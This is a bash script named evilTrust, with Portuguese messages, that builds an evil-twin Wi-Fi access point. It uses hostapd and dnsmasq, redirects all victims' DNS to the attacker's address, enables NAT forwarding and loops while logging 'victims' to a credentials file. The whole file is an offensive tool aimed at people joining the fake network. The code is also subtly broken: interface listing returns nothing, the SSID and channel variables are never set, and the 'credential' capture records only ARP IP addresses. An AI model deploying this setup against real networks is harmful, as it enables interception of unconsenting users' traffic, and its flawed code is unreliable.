#!/bin/bash

trap ctrl_c INT

function ctrl_c(){
        echo -e "\n\n[*] Saindo...\n"
        cleanup
        exit 0
}

function cleanup(){
        echo -e "[*] Limpando configurações antigas..."
        rm dnsmasq.conf hostapd.conf 2>/dev/null
        rm -r iface 2>/dev/null
        find \-name datos-privados.txt | xargs rm 2>/dev/null
        sleep 3
        ifconfig wlan0mon down 2>/dev/null
        sleep 1
        iwconfig wlan0mon mode monitor 2>/dev/null
        sleep 1
        ifconfig wlan0mon up 2>/dev/null
        airmon-ng stop wlan0mon > /dev/null 2>&1
        sleep 1
        tput cnorm
        service network-manager restart
}

function banner(){
    echo -e "\n[evilTrust v2.0 - Autor: @s4vitar (Marcelo Vázquez)]"
}

function listInterfaces(){
    echo -e "\n[*] Listando interfaces disponíveis:\n"
    counter=1
    for interface in $(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface); do
        echo -e "\t$counter. $interface"
        let counter++
    done
    rm iface 2>/dev/null
}

function chooseInterface(){
    checker=0
    while [ $checker -ne 1 ]; do
        echo -ne "\n[*] Escolha o número da interface que aceita o modo monitor: "
        read -r interface_number

        if [ "$interface_number" -ge 1 ] && [ "$interface_number" -le "$counter" ]; then
            choosed_interface=$(sed -n "${interface_number}p" iface)
            checker=1
        else
            echo -e "\n[!] Número de interface inválido."
        fi
    done
}

function configureAttack(){
    echo -e "\n[*] Configurando a interface $choosed_interface em modo monitor..."
    airmon-ng start "$choosed_interface" > /dev/null 2>&1
    choosed_interface="${choosed_interface}mon"

    echo -e "[*] Desativando network-manager, hostapd, dnsmasq, wpa_supplicant e dhcpd..."
    killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
    sleep 5

    echo -e "[*] Configurando hostapd..."
    configureHostapd

    echo -e "[*] Configurando dnsmasq..."
    configureDnsmasq

    echo -e "[*] Iniciando EvilTrust..."
    startEvilTrust
}

function configureHostapd(){
    echo -e "interface=$choosed_interface\n
driver=nl80211\n
ssid=$use_ssid\n
hw_mode=g\n
channel=$use_channel\n
macaddr_acl=0\n
auth_algs=1\n
ignore_broadcast_ssid=0" > hostapd.conf

    echo -e "[*] Configurando interface $choosed_interface"
    ifconfig "$choosed_interface" up 192.168.1.1 netmask 255.255.255.0
    route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
}

function configureDnsmasq(){
    echo -e "interface=$choosed_interface\n
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n
dhcp-option=3,192.168.1.1\n
dhcp-option=6,192.168.1.1\n
server=8.8.8.8\n
log-queries\n
log-dhcp\n
listen-address=127.0.0.1\n
address=/#/192.168.1.1" > dnsmasq.conf
}

function startEvilTrust(){
    echo -e "[*] Iniciando dnsmasq..."
    dnsmasq -C dnsmasq.conf > /dev/null 2>&1 &
    sleep 2

    echo -e "\n[*] Habilitando o redirecionamento de pacotes..."
    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables --table nat -A POSTROUTING -o eth0 -j MASQUERADE
    iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 8.8.8.8
    iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to 8.8.8.8

    echo -e "[*] Iniciando o servidor DHCP..."
    sleep 2
    /etc/init.d/isc-dhcp-server start > /dev/null 2>&1
    sleep 5

    echo -e "[*] Ataque iniciado!\n"
    getCredentials
}

function getCredentials(){
    activeHosts=0
    while true; do
        echo -e "\n[*] Esperando credenciais (Pressione Ctrl+C para finalizar)...\n"
        for i in $(cat /proc/net/arp | grep -v "IP" | awk '{print $1}'); do
            if [ -e "datos-privados.txt" ]; then
                knownHosts=$(cat datos-privados.txt | grep -v "IP" | awk '{print $1}')
                if [[ "$knownHosts" != *"$i"* ]]; then
                    echo "[*] Nova vítima encontrada: $i"
                    echo "[*] Salvando credenciais..."
                    echo -e "\n$i" >> datos-privados.txt
                    echo "[*] Credenciais salvas em datos-privados.txt\n"
                    activeHosts=1
                fi
            else
                echo -e "\n[i] Criando arquivo para salvar credenciais..."
                echo -e "\n$i" > datos-privados.txt
            fi
        done

        if [ "$activeHosts" -eq 0 ]; then
            echo -e "\n[i] Nenhuma nova vítima encontrada..."
        fi

        sleep 10
    done
}

# Main execution starts here
banner
listInterfaces
chooseInterface
configureAttack
